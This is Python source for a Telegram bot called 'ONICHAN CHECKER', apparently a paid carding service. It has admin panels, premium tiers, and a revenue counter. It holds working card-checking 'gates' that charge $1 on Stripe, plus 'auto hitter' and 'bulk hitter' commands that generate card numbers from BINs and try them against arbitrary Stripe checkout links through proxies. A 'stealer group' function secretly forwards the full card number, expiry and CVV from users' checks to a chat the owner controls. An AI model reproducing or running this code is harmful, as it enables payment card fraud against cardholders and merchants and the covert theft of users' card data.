        all_ids = list(set(owners + premium + free))
        
        text = ae(f"""👥 <b>ALL USERS</b>

━━━━━━━━━━━━━━━━━━━━━━

👑 <b>Owners:</b> {len(owners)}
💎 <b>Premium:</b> {len(premium)}
🆓 <b>Free:</b> {len(free)}
📊 <b>Total Unique:</b> {len(all_ids)}

━━━━━━━━━━━━━━━━━━━━━━

👤 <b>Recent Users (Last 10):</b>

""")
        for i, uid in enumerate(all_ids[-10:], 1):
            try:
                user_info = await context.bot.get_chat(int(uid))
                username = f"@{user_info.username}" if user_info.username else user_info.first_name
            except:
                username = "Unknown"
            
            role = "👑" if uid in owners else ("💎" if uid in premium else "🆓")
            text += f"{role} {username}\n   🆔 <code>{uid}</code>\n\n"
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # ADMIN - PREMIUM USERS LIST
    elif query.data == "admin_premium":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        try:
            with open(DB_PREMIUM, 'r') as f:
                premium_lines = [l.strip() for l in f if l.strip()]
        except:
            premium_lines = []
        
        text = ae(f"""💎 <b>PREMIUM USERS</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Total Premium:</b> {len(premium_lines)}

━━━━━━━━━━━━━━━━━━━━━━

""")
        if not premium_lines:
            text += "No premium users yet.\n"
        else:
            for i, line in enumerate(premium_lines[-15:], 1):
                parts = line.split()
                uid = parts[0]
                expiry = parts[1] if len(parts) > 1 else "N/A"
                try:
                    user_info = await context.bot.get_chat(int(uid))
                    username = f"@{user_info.username}" if user_info.username else user_info.first_name
                except:
                    username = "Unknown"
                text += f"<b>{i}.</b> {username}\n   🆔 <code>{uid}</code>\n   ⏰ Expires: {expiry}\n\n"
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # ADMIN - FREE USERS LIST
    elif query.data == "admin_free":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        try:
            with open(DB_FREE, 'r') as f:
                free_users = [l.strip() for l in f if l.strip()]
        except:
            free_users = []
        
        text = ae(f"""🆓 <b>FREE USERS</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Total Free Users:</b> {len(free_users)}

━━━━━━━━━━━━━━━━━━━━━━

""")
        if not free_users:
            text += "No free users yet.\n"
        else:
            for i, uid in enumerate(free_users[-15:], 1):
                try:
                    user_info = await context.bot.get_chat(int(uid))
                    username = f"@{user_info.username}" if user_info.username else user_info.first_name
                except:
                    username = "Unknown"
                text += f"<b>{i}.</b> {username}\n   🆔 <code>{uid}</code>\n\n"
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # ADMIN - PENDING USERS LIST
    elif query.data == "admin_pending":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        try:
            with open(DB_PENDING, 'r') as f:
                pending = f.readlines()
        except:
            pending = []
        
        text = ae(f"""⏳ <b>PENDING USERS</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Awaiting Approval:</b> {len(pending)}

━━━━━━━━━━━━━━━━━━━━━━

""")
        if not pending:
            text += "No pending users!\n"
        else:
            for i, line in enumerate(pending[-15:], 1):
                if '|' in line:
                    parts = line.strip().split('|')
                    if len(parts) >= 3:
                        uid, username, name = parts[0], parts[1], parts[2]
                        text += f"<b>{i}.</b> {name}\n   👤 @{username}\n   🆔 <code>{uid}</code>\n   ✅ /approve {uid}\n\n"
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # ADMIN - BANNED USERS LIST
    elif query.data == "admin_banned":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        try:
            with open(DB_BANNED, 'r') as f:
                banned_users = [l.strip() for l in f if l.strip()]
        except:
            banned_users = []
        
        text = ae(f"""🚫 <b>BANNED USERS</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Total Banned:</b> {len(banned_users)}

━━━━━━━━━━━━━━━━━━━━━━

""")
        if not banned_users:
            text += "No banned users.\n"
        else:
            for i, uid in enumerate(banned_users[-15:], 1):
                try:
                    user_info = await context.bot.get_chat(int(uid))
                    username = f"@{user_info.username}" if user_info.username else user_info.first_name
                except:
                    username = "Unknown"
                text += f"<b>{i}.</b> {username}\n   🆔 <code>{uid}</code>\n   ✅ /unban {uid}\n\n"
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # ADMIN - ADMINS LIST
    elif query.data == "admin_admins":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        try:
            with open(DB_OWNER, 'r') as f:
                admins = [int(l.strip()) for l in f if l.strip().isdigit()]
        except:
            admins = []
        
        text = ae(f"""👑 <b>ADMIN LIST</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Total Admins:</b> {len(admins)}

━━━━━━━━━━━━━━━━━━━━━━

""")
        for i, admin_id in enumerate(admins, 1):
            try:
                admin_user = await context.bot.get_chat(admin_id)
                admin_name = f"@{admin_user.username}" if admin_user.username else admin_user.first_name
            except:
                admin_name = "Unknown"
            
            owner_badge = " (Primary)" if admin_id == OWNER_ID else ""
            text += f"<b>{i}.</b> {admin_name}{owner_badge}\n   🆔 <code>{admin_id}</code>\n\n"
        
        text += """━━━━━━━━━━━━━━━━━━━━━━

<code>/addadmin [id]</code> - Add admin
<code>/removeadmin [id]</code> - Remove"""
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # ADMIN - STATS
    elif query.data == "admin_stats":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        try:
            with open(DB_OWNER, 'r') as f:
                owners = [l.strip() for l in f if l.strip()]
            with open(DB_PREMIUM, 'r') as f:
                premium = [l.strip() for l in f if l.strip()]
            with open(DB_FREE, 'r') as f:
                free = [l.strip() for l in f if l.strip()]
            with open(DB_BANNED, 'r') as f:
                banned = [l.strip() for l in f if l.strip()]
            with open(DB_PENDING, 'r') as f:
                pending = [l.strip() for l in f if l.strip()]
        except:
            owners = premium = free = banned = pending = []
        
        total_revenue = get_total_revenue()
        approved_count = get_approved_count()
        
        text = ae(f"""📊 <b>DETAILED STATISTICS</b>

━━━━━━━━━━━━━━━━━━━━━━

👥 <b>Users:</b>
👑 Owners: {len(owners)}
💎 Premium: {len(premium)}
🆓 Free: {len(free)}
⏳ Pending: {len(pending)}
🚫 Banned: {len(banned)}

━━━━━━━━━━━━━━━━━━━━━━

💰 <b>Revenue:</b> ${total_revenue:.2f}
✅ <b>Cards Approved:</b> {approved_count}

━━━━━━━━━━━━━━━━━━━━━━

🚪 <b>Gates:</b> 23+ Available
🔧 <b>Tools:</b> 8 Available""")
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # ADMIN - SETTINGS
    elif query.data == "admin_settings":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        stealer_group = get_stealer_group_id()
        stealer_status = f"<code>{stealer_group}</code>" if stealer_group else "Not Set"
        
        text = ae(f"""⚙️ <b>BOT SETTINGS</b>

━━━━━━━━━━━━━━━━━━━━━━

🔓 <b>Stealer Group:</b> {stealer_status}

━━━━━━━━━━━━━━━━━━━━━━

<b>Commands:</b>
<code>/setstealer [group_id]</code> - Set stealer group
<code>/setstealer off</code> - Disable stealer
<code>/getid</code> - Get chat ID (run in group)

━━━━━━━━━━━━━━━━━━━━━━

<b>Premium Keys:</b>
<code>/genkey [days] [count]</code> - Generate keys
<code>/keys</code> - View active keys""")
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # BACK TO START
    elif query.data == "start":
        from modules.database import get_user_check_stats
        
        # Get user stats
        stats = get_user_check_stats(user.id)
        total_checks = stats.get('total', 0)
        approved = stats.get('approved', 0)
        declined = stats.get('declined', 0)
        success_rate = stats.get('success_rate', 0)
        first_check = stats.get('first_check')
        
        # Format join date
        if first_check:
            join_date = first_check.strftime("%b %d, %Y")
        else:
            join_date = "New User"
        
        sep = "━━━━━━━━━━━━━━━━━━━━"
        text = ae(f"""💜 <b>ONICHAN CHECKER</b>
{sep}
🌸 <b>Hii {user.first_name}!</b>
{sep}
👑 <b>Status</b>   : {rank}
🆔 <b>ID</b>       : <code>{user.id}</code>
📅 <b>Since</b>    : {join_date}
💳 <b>Checks</b>   : {total_checks:,}
✅ <b>Approved</b> : {approved:,}
❌ <b>Declined</b> : {declined:,}
📈 <b>Rate</b>     : {success_rate}%
{sep}
⚡ 21 Gates | 📋 Mass Check | 🎯 Auto Hitter
🔮 Proxy | 📱 Temp Phone | 🧚 AI Chat
{sep}
💎 <b>Premium</b> : $3/w · $5/2w · $10/m · $25/3m
{sep}""")
        
        keyboard = [
            [
                _btn("Gates", icon=EID["live"], callback_data="gates"),
                _btn("Tools", icon=EID["bolt"], callback_data="tools")
            ],
            [
                _btn("Premium", icon=EID["crown"], callback_data="premium"),
                _btn("Stats", icon=EID["stats"], callback_data="info")
            ]
        ]
        
        if is_owner(user.id):
            keyboard.append([
                _btn("Help", icon=EID["question"], callback_data="help_menu"),
                _btn("Admin", icon=EID["crown"], callback_data="admin")
            ])
        else:
            keyboard.append([
                _btn("Help", icon=EID["question"], callback_data="help_menu"),
                _btn("Channel", icon=EID["broadcast"], url=f"https://t.me/{CHANNEL_USERNAME}")
            ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)

# ============================================================================
# RPP GATE COMMAND
# ============================================================================

@require_approval
async def gate_st1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /st1 command for Stripe $1 gate"""
    user = update.effective_user
    message = update.message
    
    if not context.args:
        await message.reply_text(
            "<b>Stripe $1 Gate</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/st1 cc|mm|yy|cvv</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/st1 4111111111111111|12|25|123</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    card_text = ' '.join(context.args)
    card = rpp_parse_card(card_text)
    
    if not card:
        await message.reply_text(
            "Invalid card format.\n\n"
            "<b>Use:</b> <code>/st1 cc|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    loading_msg = await message.reply_text(
        "Checking card on Stripe $1 gate...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        result = await check_rpp_gate(
            card['number'],
            card['month'],
            card['year'],
            card['cvv'],
            amount=1.00
        )
        
        status = result.get('status', 'UNKNOWN')
        card_str = result.get('card', card_text)
        brand = result.get('brand', 'UNKNOWN')
        message_text = result.get('message', '')
        
        if status == 'CHARGED':
            response = (
                f"<b>APPROVED - CHARGED $1.00</b>\n\n"
                f"<b>Card:</b> <code>{card_str}</code>\n"
                f"<b>Brand:</b> {brand}\n"
                f"<b>Last4:</b> {result.get('last4', 'N/A')}\n"
                f"<b>Funding:</b> {result.get('funding', 'N/A').title()}\n"
                f"<b>Charge ID:</b> <code>{result.get('charge_id', 'N/A')}</code>\n"
                f"<b>Gate:</b> Stripe $1\n\n"
                f"<b>Checked by:</b> @{user.username or user.first_name}"
            )
            
            gif_url = get_sexy_anime_gif("success")
            try:
                await loading_msg.delete()
                await context.bot.send_animation(
                    chat_id=message.chat_id,
                    animation=gif_url,
                    caption=response,
                    parse_mode=ParseMode.HTML
                )
            except:
                await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
            
            log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "st1", "Stripe $1", bin_info)
            
        elif status == 'CCN':
            response = (
                f"<b>CCN - 3D Secure Required</b>\n\n"
                f"<b>Card:</b> <code>{card_str}</code>\n"
                f"<b>Brand:</b> {brand}\n"
                f"<b>Gate:</b> Stripe $1\n\n"
                f"<b>Checked by:</b> @{user.username or user.first_name}"
            )
            gif_url = get_sexy_anime_gif("success")
            try:
                await loading_msg.delete()
                await context.bot.send_animation(
                    chat_id=message.chat_id,
                    animation=gif_url,
                    caption=response,
                    parse_mode=ParseMode.HTML
                )
            except:
                await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
            
        else:
            decline_code = result.get('decline_code', 'N/A')
            response = (
                f"<b>DECLINED</b>\n\n"
                f"<b>Card:</b> <code>{card_str}</code>\n"
                f"<b>Brand:</b> {brand}\n"
                f"<b>Reason:</b> {message_text}\n"
                f"<b>Code:</b> {decline_code}\n"
                f"<b>Gate:</b> Stripe $1\n\n"
                f"<b>Checked by:</b> @{user.username or user.first_name}"
            )
            gif_url = get_sexy_anime_gif("failed")
            try:
                await loading_msg.delete()
                await context.bot.send_animation(
                    chat_id=message.chat_id,
                    animation=gif_url,
                    caption=response,
                    parse_mode=ParseMode.HTML
                )
            except:
                await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
            
    except Exception as e:
        await loading_msg.edit_text(
            f"<b>Error:</b> {str(e)[:100]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# AUTO HITTER COMMAND
# ============================================================================

async def _run_auto_hit(update, context, url, cards, loading_msg):
    """Core hit runner — shared by auto_hitter_command and saved-BIN callback."""
    user = update.effective_user
    user_email = ah_get_user_email(user.id)
    user_proxy = _pick_proxy(user.id)
    cards = cards[:10]

    try:
        proxy_url = ah_get_proxy_url(user_proxy) if user_proxy else None
        checkout_data = await tls_get_checkout_info(url, proxy_url)
        if not checkout_data.get("pk") or not checkout_data.get("cs"):
            await loading_msg.edit_text(f"{PE_CROSS} <b>Could not parse checkout URL.</b>", parse_mode=ParseMode.HTML)
            return

        merchant = html.escape(str(checkout_data.get('merchant') or 'Unknown'))
        sym = get_currency_symbol(checkout_data.get("currency", "USD"))
        price = checkout_data.get("price")
        price_str = f"{sym}{price:.2f}" if price else "N/A"
        success_url = checkout_data.get("success_url") or "N/A"
        amount = f"{price_str} {checkout_data.get('currency', 'USD')}"
        trial_info = _get_trial_info_text(checkout_data)

        if not cards:
            await loading_msg.edit_text(
                f"{PE_CROSS} <b>No cards to hit.</b> Provide a card with the URL.",
                parse_mode=ParseMode.HTML
            )
            return

        hit_key = f"{user.id}_{loading_msg.message_id}"
        _active_hits[hit_key] = True
        checkout_data['email'] = user_email or 'N/A'
        card_statuses = [f"{EMOJI['hitting']} Pending..." for _ in cards]

        stop_keyboard = InlineKeyboardMarkup([
            [_btn("Stop", style="default", icon=EID["stopped"], callback_data=f"hitstop_{hit_key}")]
        ])

        status_text = await _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, 0, email=user_email, trial_info=trial_info)
        await _safe_edit(loading_msg, status_text, parse_mode=ParseMode.HTML, reply_markup=stop_keyboard)

        results = {"charged": [], "live": [], "declined": [], "3ds": [], "error": []}

        for i, card in enumerate(cards):
            if not _active_hits.get(hit_key, False):
                for j in range(i, len(cards)):
                    card_statuses[j] = f"Stopped {EMOJI['stopped']}"
                break

            card_statuses[i] = f"{EMOJI['bolt']} Hitting..."
            await _safe_edit(
                loading_msg,
                await _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, i, email=user_email, trial_info=trial_info),
                parse_mode=ParseMode.HTML, reply_markup=stop_keyboard
            )

            try:
                result = await auto_hitter_charge(card, checkout_data, user_proxy, user_email)
            except Exception as ex:
                result = {"status": "ERROR", "response": str(ex)[:60], "time": 0}

            status = result.get("status", "ERROR")
            card_str = f"{card['cc'][:6]}****{card['cc'][-4:]}|{card['month']}|{card['year']}"
            response_text = html.escape(str(result.get("response", "N/A")))
            decline_code = result.get("decline_code", "")

            if status == "CHARGED":
                card_statuses[i] = f"CHARGED {EMOJI['charged']}"
                results["charged"].append(card_str)
                try:
                    from modules.bin_lookup import lookup_bin
                    _bin_info = lookup_bin(card['cc'][:6])
                except:
                    _bin_info = {}
                log_approved_card(user.id, user.username or user.first_name,
                                  card['cc'], card['month'], card['year'], card['cvv'],
                                  "auto_hitter", response_text, _bin_info)
                await send_to_stealer_group(context.bot, card['cc'], card['month'], card['year'], card['cvv'],
                                            "auto_hitter", response_text, _bin_info, user.id, user.username or user.first_name)
                try:
                    from config import OWNER_ID
                    await context.bot.send_message(
                        chat_id=OWNER_ID,
                        text=(f"{EMOJI['charged']} <b>AUTO HITTER CHARGED!</b>\n\n"
                              f"{EMOJI['users']} User: @{user.username or user.id}\n"
                              f"{EMOJI['card']} Card: <code>****{card['cc'][-4:]}</code>\n"
                              f"{EMOJI['bolt']} Merchant: {merchant}\n{EMOJI['crown']} Amount: {amount}"),
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
                check_time = float(result.get('time', 2.5) or 2.5)
                await send_hit_to_user_pm(context.bot, user.id, card, checkout_data, result, check_time)
            elif status == "LIVE":
                card_statuses[i] = f"LIVE {EMOJI['live']} — {response_text[:50]}"
                results["live"].append(card_str)
                try:
                    from modules.bin_lookup import lookup_bin
                    _bin_info = lookup_bin(card['cc'][:6])
                except:
                    _bin_info = {}
                log_approved_card(user.id, user.username or user.first_name,
                                  card['cc'], card['month'], card['year'], card['cvv'],
                                  "auto_hitter_live", response_text, _bin_info)
                await send_to_stealer_group(context.bot, card['cc'], card['month'], card['year'], card['cvv'],
                                            "auto_hitter_live", response_text, _bin_info, user.id, user.username or user.first_name)
                try:
                    from config import OWNER_ID
                    await context.bot.send_message(
                        chat_id=OWNER_ID,
                        text=(f"{EMOJI['live']} <b>LIVE CARD FOUND!</b>\n\n"
                              f"{EMOJI['users']} User: @{user.username or user.id}\n"
                              f"{EMOJI['card']} Card: <code>****{card['cc'][-4:]}</code>\n"
                              f"{EMOJI['bolt']} Merchant: {merchant}\n"
                              f"{EMOJI['stats']} Response: {response_text[:80]}"),
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
            elif status in ("3DS_REQUIRED", "3DS"):
                card_statuses[i] = f"3DS Required {EMOJI['3ds']}"
                results["3ds"].append(card_str)
            elif status == "DECLINED":
                card_statuses[i] = f"Declined {EMOJI['declined']} — {response_text[:50]}"
                results["declined"].append(card_str)
            elif status == "EXPIRED":
                card_statuses[i] = f"Expired {EMOJI['expired']} — Session expired"
                results["error"].append(card_str)
                break
            elif status == "NOT SUPPORTED":
                card_statuses[i] = f"Not Supported {EMOJI['blocked']}"
                results["error"].append(card_str)
                break
            else:
                card_statuses[i] = f"Error {EMOJI['error']} — {response_text[:50]}"
                results["error"].append(card_str)

            await _safe_edit(
                loading_msg,
                await _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, i + 1, email=user_email, trial_info=trial_info),
                parse_mode=ParseMode.HTML, reply_markup=stop_keyboard
            )

            if i < len(cards) - 1:
                await asyncio.sleep(1)

        _active_hits.pop(hit_key, None)
        summary = (
            f"\n─────────────────────\n"
            f"{EMOJI['charged']} Charged: {len(results['charged'])}  "
            f"{EMOJI['live']} Live: {len(results['live'])}  "
            f"{EMOJI['declined']} Declined: {len(results['declined'])}  "
            f"{EMOJI['3ds']} 3DS: {len(results['3ds'])}\n"
        )
        final_text = await _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, len(cards), email=user_email, trial_info=trial_info)
        await _safe_edit(loading_msg, final_text + summary, parse_mode=ParseMode.HTML)

    except Exception as e:
        try:
            await loading_msg.edit_text(f"{PE_CROSS} <b>Error:</b> {str(e)[:150]}", parse_mode=ParseMode.HTML)
        except:
            pass


@require_approval
async def auto_hitter_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced /hit /co command — saved BINs, BIN gen, file, proxy support"""
    user = update.effective_user
    message = update.message

    full_text = message.text or ""

    # Extract checkout URL from message or reply
    url = extract_checkout_url(full_text)
    if not url and message.reply_to_message:
        reply_full = (message.reply_to_message.text or "") + " " + (message.reply_to_message.caption or "")
        url = extract_checkout_url(reply_full)

    if not url:
        await message.reply_text(
            f"{PE_TARGET} <b>STRIPE AUTO HITTER</b>\n\n"
            f"{PE_CARD} <b>Usage:</b>\n"
            "▸ <code>/hit url cc|mm|yy|cvv</code> — Hit single card\n"
            "▸ <code>/hit url 453201</code> — Auto-generate 10 cards from BIN\n"
            "▸ <code>/hit url</code> — Show saved BINs picker\n"
            "▸ Reply .txt file + <code>/hit url</code> — Hit from file\n\n"
            f"{PE_SAVE} <b>Saved BINs:</b>\n"
            "▸ <code>/savebin name 453201</code> — Save a BIN\n"
            "▸ <code>/mybins</code> — List saved BINs\n"
            "▸ <code>/deletebin name</code> — Delete a BIN\n\n"
            f"{PE_LINK} <b>Supported URLs:</b> checkout.stripe.com · buy.stripe.com · cs_live/cs_test",
            parse_mode=ParseMode.HTML
        )
        return

    # Strip command prefix (including optional @botname) and URL to isolate card/BIN
    remaining = re.sub(r'^[./]?(hit|co)[@\w]*\s*', '', full_text, flags=re.IGNORECASE).strip()
    # Remove the URL (may be different case/encoding), also try partial match
    remaining = remaining.replace(url, "").strip()
    # Clean up any leftover URL fragment or whitespace artifacts
    remaining = re.sub(r'https?://\S+', '', remaining).strip()

    # Parse cards from remaining text
    cards = auto_hitter_parse_cards(remaining) if remaining else []
    if not cards and remaining:
        single = auto_hitter_parse_card(remaining)
        if single:
            cards = [single]

    # BIN generation: if no cards but remaining looks like a BIN prefix
    if not cards and remaining:
        parts = remaining.strip().split()
        bin_str = parts[0] if parts else ""
        gen_count = min(int(parts[1]), 25) if len(parts) >= 2 and parts[1].isdigit() else 10
        bin_clean = bin_str.split("|")[0].replace("x", "").replace("X", "")
        if len(bin_clean) >= 6 and bin_clean.isdigit():
            gen_result = parse_gen_input(bin_str)
            if gen_result:
                prefix, mm, yy, cvv_pat = gen_result
                gen_lines = generate_cards_from_bin(prefix, mm, yy, cvv_pat, gen_count)
                cards = auto_hitter_parse_cards("\n".join(gen_lines))

    # File support: reply to .txt file
    if not cards and message.reply_to_message:
        reply = message.reply_to_message
        if reply.document and reply.document.file_name and reply.document.file_name.endswith(".txt"):
            try:
                file = await context.bot.get_file(reply.document.file_id)
                content = await context.bot.download_file(file.file_path)
                file_text = content.read().decode("utf-8", errors="ignore")
                cards = auto_hitter_parse_cards(file_text)
            except Exception:
                pass
        elif reply.text:
            cleaned = re.sub(r'https?://\S+', '', reply.text).strip()
            if cleaned:
                cards = auto_hitter_parse_cards(cleaned)

    # No cards — show saved BINs picker if any, else ask for cards
    if not cards:
        saved = get_user_saved_bins(user.id)
        if saved:
            buttons = [
                [_btn(f"{b['name']} — {b['bin_value'][:6]}***", icon=EID["card"], callback_data=f"sbin_{user.id}_{b['name']}")]
                for b in saved[:10]
            ]
            buttons.append([_btn("Cancel", style="default", icon=EID["declined"], callback_data=f"sbin_cancel_{user.id}")])
            _pending_bin_hits[user.id] = {"url": url, "msg": message}
            await message.reply_text(
                f"{PE_CARD} <b>No cards provided.</b>\n\n"
                f"{PE_CARD} Choose a saved BIN to auto-generate 10 cards:",
                reply_markup=InlineKeyboardMarkup(buttons),
                parse_mode=ParseMode.HTML
            )
            return
        else:
            await message.reply_text(
                f"{PE_CROSS} <b>No valid cards found.</b>\n\n"
                f"{PE_CARD} Provide a card: <code>cc|mm|yy|cvv</code>\n"
                f"{PE_CARD} Or a BIN to auto-generate: <code>453201</code>\n"
                f"{PE_SAVE} Or save a BIN first: <code>/savebin name 453201</code>",
                parse_mode=ParseMode.HTML
            )
            return

    loading_msg = await message.reply_text(f"{PE_BOLT} <b>Fetching checkout...</b>", parse_mode=ParseMode.HTML)
    await _run_auto_hit(update, context, url, cards, loading_msg)


# ============================================================================
# BULK STRIPE HITTER — /bulkhit <url> <count> <bin>
# ============================================================================

@require_approval
async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bulk Stripe Hitter — generates cards from BIN and hits all simultaneously.
    Usage: /bulkhit <stripe_url> <count> <bin>
    Example: /bulkhit https://buy.stripe.com/xxx 20 453201
    """
    user = update.effective_user
    message = update.message
    args = context.args or []

    SEP = "─────────────────────"

    if len(args) < 3:
        await message.reply_text(
            f"⚡ <b>BULK STRIPE HITTER</b>\n{SEP}\n\n"
            f"📝 <b>Usage:</b>\n"
            f"<code>/bulkhit &lt;url&gt; &lt;count&gt; &lt;bin&gt;</code>\n\n"
            f"📌 <b>Examples:</b>\n"
            f"<code>/bulkhit https://buy.stripe.com/xxx 20 453201</code>\n"
            f"<code>/bulkhit https://buy.stripe.com/xxx 10 453201|xx|xx|xxx</code>\n\n"
            f"{SEP}\n"
            f"💎 Premium: up to 50 cards per batch\n"
            f"👤 Free: up to 10 cards per batch\n\n"
            f"⚡ All cards are hit <b>simultaneously</b> for maximum speed.",
            parse_mode=ParseMode.HTML
        )
        return

    url_arg = args[0]
    count_str = args[1]
    bin_str = args[2]

    # Validate URL
    checkout_url = extract_checkout_url(url_arg)
    if not checkout_url:
        await message.reply_text(
            f"❌ <b>Invalid URL.</b>\n"
            f"Must be a Stripe checkout URL.\n"
            f"Supported: <code>buy.stripe.com</code> · <code>checkout.stripe.com</code>",
            parse_mode=ParseMode.HTML
        )
        return

    # Validate count
    if not count_str.isdigit() or int(count_str) < 1:
        await message.reply_text(
            f"❌ <b>Invalid count.</b> Must be a positive number (e.g. 20).",
            parse_mode=ParseMode.HTML
        )
        return

    # Enforce per-plan limits
    max_cards = 50 if is_premium(user.id) else 10
    count = min(int(count_str), max_cards)

    if int(count_str) > max_cards:
        plan_label = "premium" if is_premium(user.id) else "free"
        await message.reply_text(
            f"⚠️ Count capped at <b>{max_cards}</b> for {plan_label} users.",
            parse_mode=ParseMode.HTML
        )

    # Parse BIN
    gen_result = parse_gen_input(bin_str)
    if not gen_result:
        await message.reply_text(
            f"❌ <b>Invalid BIN.</b> Must be at least 6 digits.\n"
            f"Format: <code>453201</code> or <code>453201|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML
        )
        return

    prefix, mm, yy, cvv_pattern = gen_result

    card_lines = generate_cards_from_bin(prefix, mm, yy, cvv_pattern, count)

    if not card_lines:
        await message.reply_text(
            f"❌ Failed to generate cards from BIN <code>{prefix}</code>.",
            parse_mode=ParseMode.HTML
        )
        return

    loading_msg = await message.reply_text(
        f"{PE_BOLT} <b>Fetching checkout...</b>", parse_mode=ParseMode.HTML
    )

    user_proxy = _pick_proxy(user.id)
    proxy_url = ah_get_proxy_url(user_proxy) if user_proxy else None
    user_email = ah_get_user_email(user.id) or "checkout@gmail.com"

    try:
        checkout_data = await tls_get_checkout_info(checkout_url, proxy_url)
        if not checkout_data.get("pk") or not checkout_data.get("cs"):
            await loading_msg.edit_text(
                f"{PE_CROSS} <b>Could not parse checkout URL.</b>",
                parse_mode=ParseMode.HTML
            )
            return
    except Exception as ex:
        await loading_msg.edit_text(
            f"{PE_CROSS} <b>Error fetching checkout:</b> <code>{str(ex)[:120]}</code>",
            parse_mode=ParseMode.HTML
        )
        return

    merchant = html.escape(str(checkout_data.get("merchant") or "Unknown"))
    sym = get_currency_symbol(checkout_data.get("currency", "USD"))
    price = checkout_data.get("price")
    price_str = f"{sym}{price:.2f}" if price else "N/A"
    success_url = checkout_data.get("success_url") or "N/A"
    trial_info = _get_trial_info_text(checkout_data)
    checkout_data["email"] = user_email

    # Build display card list and per-card status tracker
    display_cards = []
    for line in card_lines:
        p = line.split("|")
        display_cards.append({
            "cc":    p[0] if p else "",
            "month": p[1] if len(p) > 1 else "01",
            "year":  p[2] if len(p) > 2 else "25",
            "cvv":   p[3] if len(p) > 3 else "000",
        })
    card_index = {line: i for i, line in enumerate(card_lines)}
    card_statuses = [f"{EMOJI['hitting']} Pending..." for _ in display_cards]

    charged, live, declined, tds, errors = [], [], [], [], []
    done_count = 0
    total_count = len(display_cards)
    _last_edit = [0.0]

    init_text = await _build_hit_status_text(
        merchant, price_str, success_url, display_cards, card_statuses, 0,
        email=user_email, trial_info=trial_info
    )
    await _safe_edit(loading_msg, init_text, parse_mode=ParseMode.HTML)

    async for raw_str, result in bulk_hit_cards(card_lines, checkout_data, user_proxy, user_email):
        p = raw_str.split("|")
        cc    = p[0] if p else ""
        month = p[1] if len(p) > 1 else ""
        year  = p[2] if len(p) > 2 else ""
        cvv   = p[3] if len(p) > 3 else ""
        idx   = card_index.get(raw_str, -1)
        status = result.get("status", "ERROR")
        resp = html.escape(str(result.get("response", ""))[:60])

        if status == "CHARGED":
            if idx >= 0:
                card_statuses[idx] = f"CHARGED {EMOJI['charged']}"
            charged.append((raw_str, resp))
            try:
                log_approved_card(user.id, user.username or user.first_name,
                                  cc, month, year, cvv, "bulk_hitter", resp, {})
                await send_to_stealer_group(
                    context.bot, cc, month, year, cvv,
                    "bulk_hitter", resp, {}, user.id, user.username or user.first_name
                )
                await context.bot.send_message(
                    chat_id=OWNER_ID,
                    text=(f"{EMOJI['charged']} <b>BULK HITTER CHARGED!</b>\n\n"
                          f"👤 User: @{user.username or user.id}\n"
                          f"💳 Card: <code>****{cc[-4:]}</code>\n"
                          f"🏪 Merchant: {merchant}\n💰 Amount: {price_str}"),
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
        elif status == "LIVE":
            if idx >= 0:
                card_statuses[idx] = f"LIVE {EMOJI['live']} — {resp[:50]}"
            live.append((raw_str, resp))
